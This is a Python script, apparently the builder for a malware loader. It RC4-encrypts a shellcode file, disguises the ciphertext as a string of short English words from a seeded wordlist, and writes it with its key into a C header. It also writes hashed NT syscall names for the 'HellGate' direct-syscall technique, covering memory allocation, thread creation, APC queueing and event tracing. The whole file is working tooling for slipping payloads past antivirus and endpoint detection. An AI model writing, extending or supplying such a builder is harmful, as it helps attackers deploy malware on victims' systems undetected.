
import os
import random
from common.crypto import rc4

base_words = [
    "aa",
    "ab",
    "ad",
    "ae",
    "ag",
    "ah",
    "ai",
    "al",
    "am",
    "an",
    "ar",
    "as",
    "at",
    "aw",
    "ax",
    "ay",
    "ba",
    "be",
    "bi",
    "bo",
    "by",
    "da",
    "do",
    "ed",
    "ef",
    "eh",
    "el",
    "em",
    "en",
    "er",
    "es",
    "et",
    "ex",
    "fa",
    "go",
    "ha",
    "he",
    "hi",
    "ho",
    "id",
    "if",
    "in",
    "is",
    "it",
    "jo",
    "ka",
    "ki",
    "la",
    "li",
    "lo",
    "ma",
    "me",
    "mi",
    "mu",
    "my",
    "na",
    "no",
    "nu",
    "od",
    "oe",
    "of",
    "oh",
    "oi",
    "om",
    "on",
    "op",
    "or",
    "os",
    "ow",
    "ox",
    "oy",
    "pa",
    "pe",
    "pi",
    "re",
    "sh",
    "si",
    "so",
    "ta",
    "to",
    "uh",
    "um",
    "un",
    "up",
    "us",
    "ut",
    "we",
    "wo",
    "xi",
    "ye",
    "yo",
    "ace",
    "act",
    "add",
    "ado",
    "age",
    "ago",
    "aid",
    "aim",
    "air",
    "ale",
    "all",
    "amp",
    "and",
    "ant",
    "any",
    "ape",
    "apt",
    "arc",
    "are",
    "ark",
    "arm",
    "art",
    "ash",
    "ask",
    "asp",
    "ate",
    "awe",
    "axe",
    "aye",
    "bad",
    "bag",
    "bah",
    "ban",
    "bar",
    "bat",
    "bay",
    "bed",
    "bee",
    "beg",
    "bet",
    "bid",
    "big",
    "bin",
    "bit",
    "boa",
    "bob",
    "bog",
    "boo",
    "bop",
    "bow",
    "box",
    "boy",
    "bra",
    "bud",
    "bug",
    "bun",
    "bus",
    "but",
    "buy",
    "bye",
    "cab",
    "cad",
    "cam",
    "can",
    "cap",
    "car",
    "cat",
    "caw",
    "cod",
    "cog",
    "con",
    "cop",
    "cow",
    "coy",
    "cry",
    "cub",
    "cue",
    "cup",
    "cur",
    "cut",
    "dab",
    "dad",
    "dam",
    "dan",
    "dap",
    "day",
    "den",
    "dew",
    "did",
    "die",
    "dig",
    "dim",
    "din",
    "dip",
    "doc",
    "doe",
    "dog",
    "don",
    "dot",
    "dry",
    "dub",
    "dud",
    "due",
    "dug",
    "dun",
    "duo",
    "dye",
    "ear",
    "eat",
    "ebb",
    "eel",
    "egg",
    "ego",
    "elf",
    "elm",
    "end",
    "era",
    "ewe",
    "eye",
    "fab",
    "fad",
    "fan",
    "far",
    "fat",
    "fax",
    "fed",
    "fee",
    "fen",
    "few",
    "fib",
    "fig",
    "fin",
    "fit",
    "fix",
    "fly",
    "foe",
    "fog",
    "fox",
    "fry",
    "fun",
    "fur",
    "gab",
    "gad",
    "gag",
    "gal",
    "gap",
    "gas",
    "gay",
    "gel",
    "gem",
    "get",
    "gig",
    "gin",
    "god",
    "got",
    "gum",
    "gun",
    "guy",
    "gym",
    "had",
    "ham",
    "has",
    "hat",
    "hay",
    "hem",
]

def to_c_array(varname, data: bytes):
    out = [f"unsigned char {varname}[] = {{"]
    for i in range(0, len(data), 12):
        line = ", ".join(f"0x{b:02X}" for b in data[i : i + 12])
        out.append("    " + line + ("," if i + 12 < len(data) else ""))
    out.append("};")
    return "\n".join(out)

def shuffle(array, seed):
    result = array.copy()

    # Initialize the seed
    current_seed = seed

    # Fisher-Yates shuffle
    for i in range(len(result) - 1, 0, -1):
        # simple LCG formula
        current_seed = (current_seed * 1103515245 + 12345) & 0x7FFFFFFF

        j = current_seed % (i + 1)

        result[i], result[j] = result[j], result[i]

    return result

def encode_encrypted_payload(shellcode: bytes, key: bytes, seed: int) -> str:
    if len(base_words) != 256:
        raise ValueError(f"base_words must contain 256 words, got {len(base_words)}")
    print("[*] encrypting payload...")

    shuffled_list = shuffle(base_words, seed)

    byte_to_word = {i: shuffled_list[i] for i in range(256)}
    encrypted = rc4(shellcode, key)
    print("[*] encoding payload...")
    encoded = [byte_to_word[b] for b in encrypted]
    print("[+] Encoding and encryption complete.")
    return " ".join(encoded)


def open_payload(input_path):
    with open(input_path, "rb") as f:
        return f.read()


def write_header(output_path: str, c_array: str, c_array_key: str, seed: int):
    print(f"[*] creating {output_path} ...")
    with open(output_path, "w") as f:
        f.write("// Automatically generated header\n")
        f.write("#pragma once\n\n")
        f.write(c_array + "\n")
        f.write(c_array_key + "\n")
        f.write(f"int seed ={seed};\n")
    print(f"[+] {output_path} successfully created.")


def fnv1a_hash(s: str) -> int:
    hash = 0xCBF29CE484222325
    for c in s:
        hash ^= ord(c)
        hash *= 0x100000001B3
        hash &= 0xFFFFFFFFFFFFFFFF
    return hash


def write_syscalls(output_path: str):
    print(f"[*] Creating syscall hash header")
    seed = random.randint(1, 1000)
    syscall_names = [
        "NtCreateThreadEx",
        "NtAllocateVirtualMemory",
        "NtProtectVirtualMemory",
        "NtWaitForSingleObject",
        "NtFreeVirtualMemory",
        "NtWriteVirtualMemory",
        "NtQueueApcThread",
        "NtAlertResumeThread",
        "NtTraceEvent",
    ]
    os.makedirs(os.path.dirname(output_path), exist_ok=True)
    with open(output_path, "w") as f:
        f.write("// Syscall hashes\n")
        f.write("#ifndef SYSCALLS_H\n")
        f.write("#define SYSCALLS_H\n\n")
        f.write("// Syscall hashes for HellGate\n")
        for name in syscall_names:
            hash_value = fnv1a_hash(name + str(seed))
            f.write(f"static DWORD64 {name}Hash = 0x{hash_value:x};\n")
        f.write(f"static int seed = {seed};\n")
        f.write("\n#endif\n\n")